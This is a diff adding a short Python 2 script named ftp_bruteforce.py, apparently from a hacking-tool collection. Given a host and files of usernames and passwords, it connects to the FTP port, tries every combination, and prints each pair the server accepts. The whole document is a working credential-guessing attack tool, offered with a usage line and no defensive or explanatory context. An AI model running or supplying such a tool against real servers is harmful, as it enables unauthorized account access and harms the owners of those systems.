@@ -1,0 +1,43 @@
+#!/usr/bin/python
+#ftp_bruteforce.py by Dr@G
+#python ftp_bruteforce.py <host> <users.txt> <pass.txt>
+import socket
+import re
+import sys
+#-Initial arguments,read usernames and passwords files------
+ftp_domain=sys.argv[1]
+usersfilename=sys.argv[2]
+passwordsfilename=sys.argv[3]
+u_file=open(usersfilename,'r')
+p_file=open(passwordsfilename,'r')
+#-----------Append file content to lists--------------------
+user_file=[]
+passwords_file=[]
+for line in u_file:
+  user_file.append(line[:-1])
+for line in p_file:
+  passwords_file.append(line[:-1])
+#--------------Connect to FTP-server function---------------
+def ftpconnect(username,password):
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  print "Testing [User]: " + username + " [Password]: " + password
+  s.connect((ftp_domain,21))
+  data = s.recv(1024)
+  s.send('USER ' + username + '\r\n')
+  data = s.recv(1024)
+  s.send('PASS ' + password + '\r\n')
+  data = s.recv(3)
+  s.send('QUIT\r\n')
+  s.close()
+  return data
+#------------Bruteforce------------------------------------
+def bruteforce():
+  for user in user_file:
+    for password in passwords_file:
+      attempt=ftpconnect(user,password)
+      if attempt == "230":
+		print "-------------------------------------------"
+		print "[Found] "+user+":"+password
+		print "-------------------------------------------"
+#-----------------------------------------------------------
+bruteforce()
